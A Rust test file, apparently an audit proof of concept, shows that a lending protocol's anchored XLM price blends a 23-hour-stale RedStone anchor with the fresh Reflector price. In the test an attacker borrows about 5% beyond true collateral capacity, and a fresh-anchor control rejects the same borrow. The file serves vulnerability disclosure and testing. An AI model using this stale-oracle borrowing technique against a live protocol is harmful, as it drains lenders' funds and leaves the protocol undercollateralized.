//! Exploit proof for the surviving hypothesis:
//! "Anchored markets blend a 24-hour-stale anchor 50/50 into the final price;
//!  per-leg freshness budgets are unrelated and the composed price has no
//!  freshness gate at all."
//!
//! Shipped mainnet XLM shape (configs/mainnet/markets.json): strategy=1
//! (PrimaryWithAnchor), primary Reflector TWAP(3) with the market-default 3600s
//! staleness budget, anchor RedStone with its OWN 86400s budget, tolerance
//! 1000bps. The final USD price is the arithmetic midpoint of the two legs
//! (oracle/tolerance.rs:24). Each leg is gated only against its own budget
//! (oracle/compose.rs:37,53) and the composed timestamp is never re-checked by
//! any solvency path (risk/totals.rs consumes feed.price only).
//!
//! Consequence: while the RedStone anchor lags (still < 24h old, so inside its
//! 86400s budget) and the true price moves, the fresh Reflector leg tracks the
//! move but the frozen anchor drags the midpoint ~halfway back. At the band edge
//! the collateral is mispriced ~5%, and that mispriced value flows unmodified
//! into the borrow LTV gate.
//!
//! This test pins causation with an A/B pair that differs ONLY in the anchor's
//! freshness: a 23h-stale anchor overvalues XLM collateral ~5% and lets the
//! attacker borrow beyond the capacity that the true (fresh-leg) price supports,
//! while the identical run with a fresh anchor prices honestly and rejects the
//! same borrow.

use test_harness::mock_redstone::MockRedStonePriceFeedClient;
use test_harness::oracle::redstone::register_redstone_adapter;
use test_harness::{usd, usd_cents, LendingTest, ALICE, BOB};

// Anchor frozen at the old price $1.00; the true (fresh Reflector) price has
// fallen to $0.91. primary/anchor ratio = 9100 bps, inside the shipped
// 1000bps band [~9091, 11000], so the two legs still blend. Midpoint =
// (1.00 + 0.91) / 2 = $0.955 => ~4.95% above the true $0.91.
const ANCHOR_FROZEN_PRICE: i128 = usd(1); // $1.00, stale leg
const TRUE_FRESH_PRICE: i128 = usd_cents(91); // $0.91, fresh Reflector leg
const XLM_TOLERANCE_BPS: u32 = 1000; // shipped XLM tolerance
const ANCHOR_MAX_STALE_SECONDS: u64 = 86_400; // shipped RedStone budget
const ANCHOR_LAG_SECONDS: u64 = 82_800; // 23h: inside the 86400s budget

const XLM_SUPPLY: f64 = 100_000.0;
// Capacity at true price: 100_000 * $0.91 * 0.75 LTV = $68_250.
// Capacity at skewed price: 100_000 * $0.955 * 0.75 LTV = $71_625.
// 70_000 sits strictly between the two, isolating the ~5% skew.
const TARGET_BORROW: f64 = 70_000.0;

struct Outcome {
    collateral_usd: f64,
    borrow: Result<(), soroban_sdk::Error>,
}

/// Build a fresh anchored XLM market, drive it to the exploit or the honest
/// state, and return the attacker's priced collateral plus the result of
/// borrowing `TARGET_BORROW` USDC against it.
///
/// `anchor_stale == true`  -> anchor frozen $1.00 backdated 23h (the attack).
/// `anchor_stale == false` -> anchor fresh at the true $0.91 (the control).
fn run(anchor_stale: bool) -> Outcome {
    let mut t = LendingTest::new()
        .with_market(test_harness::xlm_preset()) // anchored collateral
        .with_market(test_harness::usdc_preset()) // borrowable stable
        .with_dust_disabled_all_markets()
        .build();

    let xlm = t.resolve_asset("XLM");
    let feed_id = soroban_sdk::String::from_str(&t.env, "XLM");

    // Register the RedStone anchor and seed it fresh + in-band so the
    // configure-time probe accepts the market.
    let redstone = register_redstone_adapter(&t, &[("XLM", ANCHOR_FROZEN_PRICE)]);
    // Primary Reflector also in-band at config time.
    t.set_price("XLM", ANCHOR_FROZEN_PRICE);

    let cfg = test_harness::reflector_primary_redstone_anchor_config_with_anchor_stale(
        &t.mock_reflector,
        &xlm,
        &redstone,
        &feed_id,
        ANCHOR_MAX_STALE_SECONDS,
        XLM_TOLERANCE_BPS,
    );
    t.configure_market_oracle(&xlm, &cfg);

    // Move the fresh Reflector primary to the true price (spot + TWAP, stamped
    // at `now`, well inside its 3600s budget).
    t.set_price("XLM", TRUE_FRESH_PRICE);

    // Drive the anchor into the two scenarios.
    let redstone_client = MockRedStonePriceFeedClient::new(&t.env, &redstone);
    let now = t.env.ledger().timestamp();
    if anchor_stale {
        // Frozen at the OLD $1.00, backdated 23h: inside the 86400s budget but
        // 23x the primary's 3600s budget.
        let stale_ms = now.saturating_sub(ANCHOR_LAG_SECONDS) * 1000;
        redstone_client.set_price_data(&feed_id, &ANCHOR_FROZEN_PRICE, &stale_ms, &stale_ms);
    } else {
        // Honest control: anchor fresh at the SAME true price the primary reads.
        let fresh_ms = now * 1000;
        redstone_client.set_price_data(&feed_id, &TRUE_FRESH_PRICE, &fresh_ms, &fresh_ms);
    }

    // Seed borrowable USDC liquidity.
    t.supply(BOB, "USDC", 500_000.0);

    // Attacker supplies XLM collateral (supply reads no price, so it never
    // touches the anchored feed).
    t.supply(ALICE, "XLM", XLM_SUPPLY);

    let collateral_usd = t.total_collateral(ALICE);
    let borrow = t.try_borrow(ALICE, "USDC", TARGET_BORROW);

    Outcome {
        collateral_usd,
        borrow,
    }
}

#[test]
fn audit_borrow_withdraw_liquidate_stale_anchor_blends_5pct_skew_into_ltv() {
    let exploit = run(true);
    let control = run(false);

    // 1) The stale anchor really does survive into the priced collateral: the
    //    23h-stale $1.00 leg blends 50/50 with the fresh $0.91 leg, inflating
    //    the attacker's collateral ~5% above the honest valuation. The only
    //    difference between the two runs is the anchor's freshness.
    let inflation = exploit.collateral_usd / control.collateral_usd;
    assert!(
        inflation > 1.04,
        "stale-anchor blend must inflate collateral >4% vs the honest fresh-anchor \
         valuation: exploit={} control={} ratio={}",
        exploit.collateral_usd,
        control.collateral_usd,
        inflation
    );

    // 2) Value extraction: the inflated valuation lets the attacker borrow
    //    $70,000 — MORE than the $68,250 the true collateral value supports —
    //    leaving the protocol undercollateralized once the anchor catches up.
    assert!(
        exploit.borrow.is_ok(),
        "stale-anchor skew must let the attacker borrow beyond true capacity: {:?}",
        exploit.borrow
    );

    // 3) Causation pin: the identical borrow against the HONESTLY-priced
    //    collateral (fresh anchor, same $0.91 true price) is rejected. Nothing
    //    but the anchor's staleness separates success from failure.
    assert!(
        control.borrow.is_err(),
        "honest fresh-anchor pricing must reject the over-capacity borrow, \
         proving the stale anchor alone enabled it"
    );
}
